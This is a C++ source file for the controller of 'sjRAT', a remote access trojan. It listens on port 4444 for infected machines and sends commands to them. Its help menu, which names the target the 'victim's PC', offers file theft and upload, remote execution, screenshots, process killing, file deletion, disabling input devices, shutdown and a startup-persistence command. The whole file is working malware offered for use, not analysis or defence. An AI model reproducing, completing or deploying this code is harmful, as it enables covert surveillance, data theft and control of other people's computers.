#include "includes.h"
#include "UpDown.h"
#include "colors.h"

std::string GenerateRandomFilename()
{
    const std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const int length = 8;  // Длина случайного имени файла

    std::random_device rd; // gets random seed for generation
    std::mt19937 generator(rd());
    std::uniform_int_distribution<int> distribution(0, characters.size() - 1); // generate random index

    std::string randomFilename;
    for (int i = 0; i < length; ++i)
    {
        int index = distribution(generator);
        randomFilename += characters[index];
    }

    return randomFilename;
}

void SendAndReceive(SOCKET client, std::string command)
{
    send(client, command.c_str(), command.size(), 0);
    char buff[1024];
    int bytesReceived = recv(client, buff, sizeof(buff), 0);
    if (bytesReceived > 0) {
        buff[bytesReceived] = '\0';

        ColoredText(F_CYAN); // set text color

        printf("[*] %s\n", buff);
    }
}

void help_menu()
{
    ColoredText(F_LIGHTCYAN);
    printf("==============HELP-MENU==============\n");
    printf("sysinfo - see information about victim's PC\n\n");
    printf("msgbox - summon MessageBox on victim's PC\n\n");
    printf("beep <sec> - play weird sound for X sec on victim's PC\n\n");
    printf("upload <file> - send file to victim's PC\n\n");
    printf("download <file> - download file from victim's PC\n\n");
    printf("execute <file/url> - lauch file or open url\n\n");
    printf("reboot - reboot victim's PC\n\n");
    printf("shutdown - turn off victim's PC\n\n");
    printf("ping - show latency\n\n");
    printf("monitor off/on - turn off/on victim's monitor\n\n");
    printf("keyboard off/on - disable/enable keyboard\n\n");
    printf("mouse off/on - disable/enable mouse\n\n");
    printf("pids - get all process running on victim's PC\n\n");
    printf("kill <pid> - kill process on victim's PC\n\n");
    printf("screenshot - take screenshot from victim's PC\n\n");
    printf("play <file> - play music from file\n\n");
    printf("wallpaper <file> - set wallpaper on victim`s PC\n\n");
    printf("delete <file> - remove file from victim`s PC\n\n");
    printf("help - see this message\n\n");
    printf("exit - exit sjRAT and terminate client session\n\n");
    printf("=====================================\n");
    ColoredText(F_WHITE);
}

void banner()
{
    ColoredText(F_DARKGRAY);

    printf("=========================https://github.com/Quality15/sjRAT========================\n");
    printf("   d888888o.             8 8888 8 888888888o.            .8.    8888888 8888888888 \n");
    printf(" .`8888:' `88.           8 8888 8 8888    `88.          .888.         8 8888       \n");
    printf(" 8.`8888.   Y8           8 8888 8 8888     `88         :88888.        8 8888       \n");
    printf(" `8.`8888.               8 8888 8 8888     ,88        . `88888.       8 8888       \n");
    printf("  `8.`8888.              8 8888 8 8888.   ,88'       .8. `88888.      8 8888       \n");
    printf("   `8.`8888.             8 8888 8 888888888P'       .8`8. `88888.     8 8888       \n");
    printf("    `8.`8888. 88.        8 8888 8 8888`8b          .8' `8. `88888.    8 8888       \n");
    printf("8b   `8.`8888.`88.       8 888' 8 8888 `8b.       .8'   `8. `88888.   8 8888       \n");
    printf("`8b.  ;8.`8888  `88o.    8 88'  8 8888   `8b.    .888888888. `88888.  8 8888       \n");
    printf(" `Y8888P ,88P'    `Y888888 '    8 8888     `88. .8'       `8. `88888. 8 8888       \n");
    printf("================================v%s=============================================\n", VERSION.c_str());

    ColoredText(F_WHITE); // reset
}

void MeasurePingTime(SOCKET client)
{
    // Отправляем текущее время клиенту
    auto start = std::chrono::high_resolution_clock::now();
    send(client, reinterpret_cast<char*>(&start), sizeof(start), 0);

    // Получаем время отклика от клиента
    std::chrono::high_resolution_clock::time_point end;
    int bytesReceived = recv(client, reinterpret_cast<char*>(&end), sizeof(end), 0);
    if (bytesReceived == sizeof(end)) {
        // Вычисляем время отклика
        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
        double pingTime = duration.count() / 1000.0;  // Конвертируем в миллисекунды
        printf("[*] Ping time: %.2f ms\n", pingTime);
    }
    else {
        printf("Failed to measure ping time\n");
    }
}

int main(int argc, char* argv[])
{
    char ip_addr[] = "192.168.31.135";
    int port = 4444;

    // Show banner
    banner();

    // HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE); // for changing text color

    // Startup WinSock
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    WSADATA wsaData;
    WORD DllVersion = MAKEWORD(2, 1);
    if (WSAStartup(DllVersion, &wsaData) != 0)
    {
        printf("WinSock startup failed\n");
        exit(1);
    }

    SOCKADDR_IN addr;
    int sizeofaddr = sizeof(addr);
    addr.sin_addr.s_addr = htonl(INADDR_ANY); // to public connections | inet_addr("127.0.0.1") <- connections only from local network
    // addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(port); // port
    addr.sin_family = AF_INET; // IPv4

    SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL); // socket that listens for connetions
    bind(sListen, (SOCKADDR*)&addr, sizeof(addr)); // bind address to the socket
    ColoredText(F_MAGENTA);
    printf("[*] Listening for connections...\n");
    listen(sListen, SOMAXCONN); // start listen for connections

    SOCKET client;
    client = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr); // accept client connection
    if (client == 0)
    {
        printf("Failed to accept client's connection\n%d\n", WSAGetLastError());
        exit(1);
    } else {
        // Get connected client IP
        struct sockaddr_in addr_in;
        int addrSize = sizeof(addr_in);
        getpeername(client, (struct sockaddr*)&addr_in, &addrSize);
        const char* clientIP = inet_ntoa(addr_in.sin_addr);
        ColoredText(F_GREEN);
        printf("[+] New connection from %s!\n", clientIP);
        
        bool clientConnected = true;

        std::string command;
        while (true) 
        {
            ColoredText(F_GREEN);
            std::cout << "sj> ";
            std::getline(std::cin, command);

            if (command.substr(0, 6) == "msgbox") {
                if (command.length() > 6) {
                    SendAndReceive(client, command); 
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: msgbox <text>\n");
                }
            }
            else if (command.substr(0, 4) == "beep") {
                if (command.length() > 4) {
                    std::string durStr = command.substr(5);
                    if (durStr.length() > 0) {
                        int dur = std::stoi(durStr);
                        SendAndReceive(client, command);
                    } else {
                        ColoredText(F_LIGHTRED);
                        printf("[!] Usage: beep <duration (in seconds)>\n");
                    }
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: beep <duration (in seconds)>\n");
                }
            }
            else if (command == "sysinfo" || command == "systeminfo" || command == "info") {
                SendAndReceive(client, command);
            }
            else if (command.substr(0, 6) == "upload") {
                if (command.length() > 6) {
                    std::string filename = command.substr(7);
                    SendAndReceive(client, command);
                    SendFile(client, &filename[0]);
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: upload <filename>\n");
                }
            }
            else if (command.substr(0, 8) == "download") {
                if (command.length() > 8) {
                    SendAndReceive(client, command);
                    std::string filePath = command.substr(9);
                    std::filesystem::path path(filePath);
                    std::string filename = path.filename().string();

                    ReceiveFile(client, filename);
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: download <filename>\n");
                }
            }
            else if (command.substr(0, 6) == "delete") {
                if (command.length() > 6) {
                    SendAndReceive(client, command);
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: delete <filename>\n");
                }
            }
            else if (command.substr(0, 7) == "execute") {
                SendAndReceive(client, command);
            }
            else if (command == "shutdown") {
                SendAndReceive(client, command);
            }
            else if (command == "reboot") {
                SendAndReceive(client, command);
            }
            else if (command == "ping") {
                MeasurePingTime(client);
            }
            else if (command.substr(0, 8) == "keyboard") {
                std::string state = command.substr(9);
                if (state == "on") {
                    SendAndReceive(client, command);
                } else if (state == "off") {
                    SendAndReceive(client, command);
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: keyboard off/on\n");
                }
            }
            else if (command.substr(0, 5) == "mouse") {
                std::string state = command.substr(6);
                if (state == "on") {
                    SendAndReceive(client, command);
                } else if (state == "off") {
                    SendAndReceive(client, command);
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: mouse off/on\n");
                }
            }
            else if (command.substr(0, 7) == "monitor") {
                std::string state = command.substr(8);
                if (state == "on") {
                    SendAndReceive(client, command);
                } else if (state == "off") {
                    SendAndReceive(client, command);
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: monitor off/on\n");
                }
            }
            else if (command == "pids") {
                // SendAndReceive(client, command); // too few bytes
                send(client, command.c_str(), command.size(), 0);
                char buff[2000000];
                int bytesReceived = recv(client, buff, sizeof(buff), 0);
                if (bytesReceived > 0) {
                    buff[bytesReceived] = '\0';
                    printf("[*] %s\n", buff);
                }
            }
            else if (command.substr(0, 4) == "kill") {
                if (command.length() > 4) {
                    std::string pidStr = command.substr(5);
                    SendAndReceive(client, command);
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: kill <pid>\n");
                }
            }
            else if (command == "screenshot") {
                // SendAndReceive(client, command);
                send(client, command.c_str(), command.size(), 0);

                std::string filename = GenerateRandomFilename() + ".bmp";
                ReceiveFile(client, filename);
                ColoredText(F_CYAN);
                printf("[*] Screenshot received: %s\n", filename.c_str());

                // open screenshot
                HINSTANCE hInstance = ShellExecute(NULL, "open", filename.c_str(), NULL, NULL, SW_SHOWMAXIMIZED);
                if ((int)hInstance <= 32)
                {
                    ColoredText(F_LIGHTRED);
                    printf("[*] Failed to open %s\n", filename);
                }
            }
            else if (command.substr(0, 4) == "play") {
                if (command.length() > 4) {
                    std::string file = command.substr(5);
                    SendAndReceive(client, command); // send `send sound.mp3s` command                    
                    SendFile(client, file.c_str()); // sendinf file to client
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: play <file>\n");
                }
            }
            else if (command.substr(0, 9) == "wallpaper") {
                if (command.length() > 9) {
                    std::string file = command.substr(10);
                    SendAndReceive(client, command);                 
                    SendFile(client, file.c_str());
                } else {
                    ColoredText(F_LIGHTRED);
                    printf("[!] Usage: wallpaper <file>\n");
                }
            }
            else if (command == "add-startup") {
                SendAndReceive(client, command);
            }

            else if (command == "help") {
                help_menu();
            }
            else if (command == "exit" || command == "quit" || command == "bye") {
                SendAndReceive(client, command.c_str());
                closesocket(client);
                clientConnected = false;
                system("pause");
                exit(0);
            }
        }
    }

    system("pause");
}